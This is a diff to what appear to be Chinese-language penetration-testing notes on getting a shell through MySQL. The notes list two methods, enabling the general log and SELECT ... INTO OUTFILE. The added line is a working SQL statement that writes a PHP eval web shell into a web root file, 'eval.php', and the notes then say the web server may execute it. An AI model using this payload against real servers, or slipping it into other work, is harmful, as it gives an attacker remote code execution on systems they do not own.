@@ -4,6 +4,7 @@ getshell
 通过
 1. 开启general log，使用sql拼接
 2. select ... from ... into outfile
+   Select '<?php eval($_POST[cmd]);?>' into outfile 'F:/wwwroot/eval.php';
 将代码写入文件
 文件放在web程序的对应目录，web程序有可能执行该文件 如php
 
